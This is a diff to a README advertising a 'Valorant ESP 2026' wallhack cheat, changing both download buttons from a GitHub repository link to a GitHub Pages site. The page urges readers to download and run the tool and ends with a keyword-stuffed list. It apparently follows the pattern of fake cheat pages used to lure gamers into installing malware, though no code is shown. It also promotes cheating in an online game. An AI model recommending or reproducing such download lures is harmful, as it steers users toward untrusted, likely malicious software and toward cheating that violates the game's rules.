@@ -36,7 +36,7 @@ You control how far the ESP works. Set it to 100 meters for close-quarters comba
 
 ### Step 1: Get the Download
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_ESP_2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/islamicstatus4488/valorant-esp-wallhack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_ESP_2026-2ea44f?style=for-the-badge&logo=github)](https://islamicstatus4488.github.io)
 
 Visit this link to download the application. The download page will open in your browser.
 
@@ -119,6 +119,6 @@ The tool uses less than 50 MB of RAM and less than 1% CPU usage on average syste
 
 Don't miss out on seeing every enemy before they see you. Click the download button below and dominate your next match.
 
-[![Download Valorant ESP 2026](https://img.shields.io/badge/⬇️_Download-v2026_Latest-important?style=for-the-badge&logo=github&logoColor=white)](https://github.com/islamicstatus4488/valorant-esp-wallhack-2026)
+[![Download Valorant ESP 2026](https://img.shields.io/badge/⬇️_Download-v2026_Latest-important?style=for-the-badge&logo=github&logoColor=white)](https://islamicstatus4488.github.io)
 
 Keywords: valorant esp, wallhack, cheat, aimbot, esp hack, valorant hack, game cheat, esp wallhack 2026, free download, windows tool, gaming utility
